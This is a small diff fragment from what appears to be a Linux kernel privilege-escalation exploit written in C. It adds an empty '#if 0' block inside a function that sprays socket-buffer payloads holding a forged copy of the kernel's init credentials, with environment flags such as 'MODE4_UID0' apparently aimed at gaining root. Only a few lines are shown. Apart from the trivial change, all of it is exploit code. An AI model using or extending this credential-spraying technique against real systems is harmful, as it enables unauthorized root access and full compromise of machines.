@@ -2222,6 +2222,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       if (pselect_custom_write >= 2 || env_flag("MODE4_SLIDE_CRED", 0) ||
           env_flag("MODE4_UID0", 0)) {
         fill_init_cred_copy(p, CRED_COPY_OFF, payload_base + CRED_COPY_OFF);
+#if 0 /* padded variant below */
+#endif
         if (chunk == 0) {
           g_cred_copy = payload_base + CRED_COPY_OFF;
           pr_info("cred_copy=%016zx (spray; W2 VALUE, not init_cred)\n",
